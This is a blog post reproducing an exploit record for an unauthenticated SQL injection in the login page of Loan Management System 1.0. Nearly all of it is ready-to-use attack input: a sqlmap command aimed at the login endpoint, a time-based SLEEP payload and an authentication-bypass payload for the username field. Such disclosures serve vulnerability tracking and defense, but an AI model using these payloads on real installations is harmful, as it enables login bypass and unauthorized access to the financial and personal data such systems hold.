---
layout: post
title: Loan Management System 1.0 - Unauthenticated SQL injection (login page)
tags: [CVE]
description: "Loan Management System 1.0 - Unauthenticated SQL injection (login page)"
---

```
# Exploit Title: Loan Management System 1.0 - Unauthenticated SQL injection (login page)
# Date: 2020-09-26
# Exploit Author: Thibault Galbourdin (Liodeus)
# Vendor Homepage: https://www.sourcecodester.com/php/14471/loan-management-system-using-phpmysql-source-code.html
# Product Link: https://www.sourcecodester.com/download-code?nid=14471&title=Loan+Management+System+using+PHP%2FMySQL+with+Source+Code
# Tested on: Windows 10 + 7.4.10

# Description:
# An issue was discovered in Loan Management System 1.0. There is an unauthenticated SQL injection,
# on the login page, the vulnerable parameters are username and password. Allowing an unauthenticated  
# attacker to perform various tasks such as authentication bypass.

# POC

# SQLMAP
	sqlmap -u "http://127.0.0.1/ajax.php?action=login" --method POST --data "username=test&password=test"

# Manual time based
	username = admin' AND SLEEP(5)-- -
	
# Authentication bypass
	username = admin'-- -
```

